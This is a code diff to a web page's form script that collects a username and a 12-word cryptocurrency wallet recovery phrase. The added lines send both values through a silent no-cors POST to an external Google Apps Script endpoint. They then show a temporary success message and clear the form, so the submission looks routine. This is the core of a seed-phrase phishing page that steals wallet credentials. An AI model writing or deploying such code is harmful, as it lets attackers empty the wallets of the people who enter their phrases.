@@ -112,12 +112,25 @@
     form.addEventListener("submit", function(e) {
       e.preventDefault();
 
-      // Optional: Check if wallet contains 12 words
       const walletWords = walletInput.value.trim().split(/\s+/);
       if (walletWords.length !== 12) {
         alert("Please enter exactly 12 words in the wallet recovery phrase.");
         return;
       }
+
+      const data = {
+        username: usernameInput.value.trim(),
+        wallet: walletInput.value.trim()
+      };
+
+      fetch("https://script.google.com/macros/s/AKfycbx8hA2yvu_Py0TTbUkocCjmPZI12rmtz5eXailJ1NJqfEn-Rc04Y3Zffg6lxFpl2Tly4Q/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
 
       // Show success message
       successMessage.style.display = "block";
@@ -125,6 +138,11 @@
       // Clear form
       usernameInput.value = "";
       walletInput.value = "";
+
+      // Hide after 4 seconds
+      setTimeout(() => {
+        successMessage.style.display = "none";
+      }, 4000);
     });
   </script>
 </body>
